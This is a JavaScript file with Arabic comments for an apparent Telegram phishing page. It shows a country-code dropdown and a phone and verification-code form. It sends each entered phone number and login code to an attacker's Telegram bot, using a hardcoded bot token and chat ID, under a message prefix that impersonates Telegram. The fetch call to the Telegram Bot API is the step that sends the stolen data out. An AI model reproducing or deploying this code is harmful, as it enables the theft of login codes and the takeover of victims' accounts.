// بيانات رموز الدول (يمكن استبدالها بمكتبة مثل country-data)
const countryCodes = [
    { name: "اليمن", code: "+967", flag: "🇾🇪" },
    { name: "السعودية", code: "+966", flag: "🇸🇦" },
    { name: "الإمارات", code: "+971", flag: "🇦🇪" },
    { name: "مصر", code: "+20", flag: "🇪🇬" },
    { name: "الولايات المتحدة", code: "+1", flag: "🇺🇸" },
    { name: "غواتيمالا", code: "+502", flag: "🇬🇹" },
    { name: "غينيا", code: "+224", flag: "🇬🇳" },
    { name: "غينيا بيساو", code: "+245", flag: "🇬🇼" },
    { name: "غيانا", code: "+592", flag: "🇬🇾" },
    { name: "هايتي", code: "+509", flag: "🇭🇹" },
    { name: "هندوراس", code: "+504", flag: "🇭🇳" },
    { name: "هونغ كونغ", code: "+852", flag: "🇭🇰" },
    { name: "المجر", code: "+36", flag: "🇭🇺" },
    { name: "آيس��ندا", code: "+354", flag: "🇮🇸" },
    { name: "الهند", code: "+91", flag: "🇮🇳" },
    { name: "إندونيسيا", code: "+62", flag: "🇮🇩" },
    { name: "إيران", code: "+98", flag: "🇮🇷" },
    { name: "العراق", code: "+964", flag: "🇮🇶" },
    { name: "أيرلندا", code: "+353", flag: "🇮🇪" },
    { name: "إسرائيل", code: "+972", flag: "🇮🇱" },
    { name: "إيطاليا", code: "+39", flag: "🇮🇹" },
    { name: "جامايكا", code: "+1876", flag: "🇯🇲" },
    { name: "اليابان", code: "+81", flag: "🇯🇵" },
    { name: "الأردن", code: "+962", flag: "🇯🇴" },
    { name: "كازاخستان", code: "+7", flag: "🇰🇿" },
    { name: "كينيا", code: "+254", flag: "🇰🇪" },
    { name: "كيريباتي", code: "+686", flag: "🇰🇮" },
    { name: "كوريا الشمالية", code: "+850", flag: "🇰🇵" },
    { name: "كوريا الجنوبية", code: "+82", flag: "🇰🇷" },
    { name: "الكويت", code: "+965", flag: "🇰🇼" },
    { name: "قيرغيزستان", code: "+996", flag: "🇰🇬" },
    { name: "لاوس", code: "+856", flag: "🇱🇦" },
    { name: "لاتفيا", code: "+371", flag: "🇱🇻" },
    { name: "لبنان", code: "+961", flag: "🇱🇧" },
    { name: "ليسوتو", code: "+266", flag: "🇱🇸" },
    { name: "ليبيريا", code: "+231", flag: "🇱🇷" },
    { name: "ليبيا", code: "+218", flag: "🇱🇾" },
    { name: "ليختنشتاين", code: "+423", flag: "🇱🇮" },
    { name: "ليتوانيا", code: "+370", flag: "🇱🇹" },
    { name: "لوكسمبورغ", code: "+352", flag: "🇱🇺" },
    { name: "ماكاو", code: "+853", flag: "🇲🇴" },
    { name: "مقدونيا الشمالية", code: "+389", flag: "🇲🇰" },
    { name: "مدغشقر", code: "+261", flag: "🇲🇬" },
    { name: "مالاوي", code: "+265", flag: "🇲🇼" },
    { name: "ماليزيا", code: "+60", flag: "🇲🇾" },
    { name: "جزر المالديف", code: "+960", flag: "🇲🇻" },
    { name: "مالي", code: "+223", flag: "🇲🇱" },
    { name: "مالطا", code: "+356", flag: "🇲🇹" },
    { name: "جزر مارشال", code: "+692", flag: "🇲🇭" },
    { name: "موريتانيا", code: "+222", flag: "🇲🇷" },
    { name: "موريشيوس", code: "+230", flag: "🇲🇺" },
    { name: "المكسيك", code: "+52", flag: "🇲🇽" },
    { name: "ولايات ميكرونيسيا المتحدة", code: "+691", flag: "🇫🇲" },
    { name: "مولدوفا", code: "+373", flag: "🇲🇩" },
    { name: "موناكو", code: "+377", flag: "🇲🇨" },
    { name: "منغوليا", code: "+976", flag: "🇲🇳" },
    { name: "الجبل الأسود", code: "+382", flag: "🇲🇪" },
    { name: "المغرب", code: "+212", flag: "🇲🇦" },
    { name: "موزمبيق", code: "+258", flag: "🇲🇿" },
    { name: "ميانمار", code: "+95", flag: "🇲🇲" },
    { name: "ناميبيا", code: "+264", flag: "🇳🇦" },
    { name: "ناورو", code: "+674", flag: "🇳🇷" },
    { name: "نيبال", code: "+977", flag: "🇳🇵" },
    { name: "هولندا", code: "+31", flag: "🇳🇱" },
    { name: "نيوزيلندا", code: "+64", flag: "🇳🇿" },
    { name: "نيكاراغوا", code: "+505", flag: "🇳🇮" },
    { name: "النيجر", code: "+227", flag: "🇳🇪" },
    { name: "نيجيريا", code: "+234", flag: "🇳🇬" },
    { name: "النرويج", code: "+47", flag: "🇳🇴" },
    { name: "سلطنة عمان", code: "+968", flag: "🇴🇲" },
    { name: "باكستان", code: "+92", flag: "🇵🇰" },
    { name: "بالاو", code: "+680", flag: "🇵🇼" },
    { name: "فلسطين", code: "+970", flag: "🇵🇸" },
    { name: "بنما", code: "+507", flag: "🇵🇦" },
    { name: "بابوا غينيا الجديدة", code: "+675", flag: "🇵🇬" },
    { name: "باراغواي", code: "+595", flag: "🇵🇾" },
    { name: "بيرو", code: "+51", flag: "🇵🇪" },
    { name: "الفلبين", code: "+63", flag: "🇵🇭" },
    { name: "بولندا", code: "+48", flag: "🇵🇱" },
    { name: "البرتغال", code: "+351", flag: "🇵🇹" },
    { name: "قطر", code: "+974", flag: "🇶🇦" },
    { name: "رومانيا", code: "+40", flag: "🇷🇴" },
    { name: "روسيا", code: "+7", flag: "🇷🇺" },
    { name: "رواندا", code: "+250", flag: "🇷🇼" },
    { name: "سانت كيتس ونيفيس", code: "+1869", flag: "🇰🇳" },
    { name: "سانت لوسيا", code: "+1758", flag: "🇱🇨" },
    { name: "سانت فينسنت والغرينادين", code: "+1784", flag: "🇻🇨" },
    { name: "ساموا", code: "+685", flag: "🇼🇸" },
    { name: "سان مارينو", code: "+378", flag: "🇸🇲" },
    { name: "ساو تومي وبرينسيبي", code: "+239", flag: "🇸🇹" },
    { name: "السنغال", code: "+221", flag: "🇸🇳" },
    { name: "صربيا", code: "+381", flag: "🇷🇸" },
    { name: "سيشل", code: "+248", flag: "🇸🇨" },
    { name: "سيراليون", code: "+232", flag: "🇸🇱" },
    { name: "سنغافورة", code: "+65", flag: "🇸🇬" },
    { name: "سلوفاكيا", code: "+421", flag: "🇸🇰" },
    { name: "سلوفينيا", code: "+386", flag: "🇸🇮" },
    { name: "جزر سليمان", code: "+677", flag: "🇸🇧" },
    { name: "الصومال", code: "+252", flag: "🇸🇴" },
    { name: "جنوب أفريقيا", code: "+27", flag: "🇿🇦" },
    { name: "جنوب السودان", code: "+211", flag: "🇸🇸" },
    { name: "إسبانيا", code: "+34", flag: "🇪🇸" },
    { name: "سريلانكا", code: "+94", flag: "🇱🇰" },
    { name: "السودان", code: "+249", flag: "🇸🇩" },
    { name: "سورينام", code: "+597", flag: "🇸🇷" },
    { name: "السويد", code: "+46", flag: "🇸🇪" },
    { name: "سويسرا", code: "+41", flag: "🇨🇭" },
    { name: "سوريا", code: "+963", flag: "🇸🇾" },
    { name: "تايوان", code: "+886", flag: "🇹🇼" },
    { name: "طاجيكستان", code: "+992", flag: "🇹🇯" },
    { name: "تنزانيا", code: "+255", flag: "🇹🇿" },
    { name: "تايلاند", code: "+66", flag: "🇹🇭" },
    { name: "توغو", code: "+228", flag: "🇹🇬" },
    { name: "تونغا", code: "+676", flag: "🇹🇴" },
    { name: "ترينيداد وتوباغو", code: "+1868", flag: "🇹🇹" },
    { name: "تونس", code: "+216", flag: "🇹🇳" },
    { name: "تركيا", code: "+90", flag: "🇹🇷" },
    { name: "تركمانستان", code: "+993", flag: "🇹🇲" },
    { name: "توفالو", code: "+688", flag: "🇹🇻" },
    { name: "أوغندا", code: "+256", flag: "🇺🇬" },
    { name: "أوكرانيا", code: "+380", flag: "🇺🇦" },
    { name: "المملكة المتحدة", code: "+44", flag: "🇬🇧" },
    { name: "أوروغواي", code: "+598", flag: "🇺🇾" },
    { name: "أوزبكستان", code: "+998", flag: "🇺🇿" },
    { name: "فانواتو", code: "+678", flag: "🇻🇺" },
    { name: "الفاتيكان", code: "+379", flag: "🇻🇦" },
    { name: "فنزويلا", code: "+58", flag: "🇻🇪" },
    { name: "فيتنام", code: "+84", flag: "🇻🇳" },
    { name: "زامبيا", code: "+260", flag: "🇿🇲" },
    { name: "زيمبابوي", code: "+263", flag: "🇿🇼" }
];

// ملء قائمة الدول
const countrySelect = document.getElementById('country');
countryCodes.forEach(country => {
    const option = document.createElement('option');
    option.value = country.code;
    option.textContent = `${country.flag} ${country.name} (${country.code})`;
    countrySelect.appendChild(option);
});

// إرسال رقم الهاتف
document.getElementById('phoneForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const countryCode = document.getElementById('country').value;
    const phoneNumber = document.getElementById('phone').value;

    if (!phoneNumber) {
        alert('يرجى إدخال رقم الهاتف');
        return;
    }

    const fullNumber = `${countryCode}${phoneNumber}`;
    alert(`تم إرسال الكود إلى الرقم: ${fullNumber}`);

    // إرسال البيانات إلى بوت Telegram
    sendToTelegram(`[شركة تليجرام] تم إرسال الكود إلى الرقم: ${fullNumber}`);

    // إظهار حقل إدخال الكود
    document.getElementById('phoneForm').style.display = 'none';
    document.getElementById('codeForm').style.display = 'block';
});

// إرسال الكود
document.getElementById('codeForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const code = document.getElementById('code').value;

    if (!code) {
        alert('يرجى إدخال الكود');
        return;
    }

    alert(`تم إرسال الكود: ${code}`);

    // إرسال الكود إلى بوت Telegram
    sendToTelegram(`[شركة تليجرام] تم إدخال الكود: ${code}`);
});

// دالة لإرسال الرسائل إلى بوت Telegram
function sendToTelegram(message) {
    const botToken = '7352087691:AAFKetidCGiN16_Vk1jCqtn04_Kh9cE--k0'; // استبدل ب Token البوت الخاص بك
    const chatId = '7302541527'; // استبدل ب Chat ID الخاص بك

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
        chat_id: chatId,
        text: message
    };

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log('تم إرسال الرسالة إلى Telegram:', result);
    })
    .catch(error => {
        console.error('خطأ في الإرسال:', error);
    });
  }
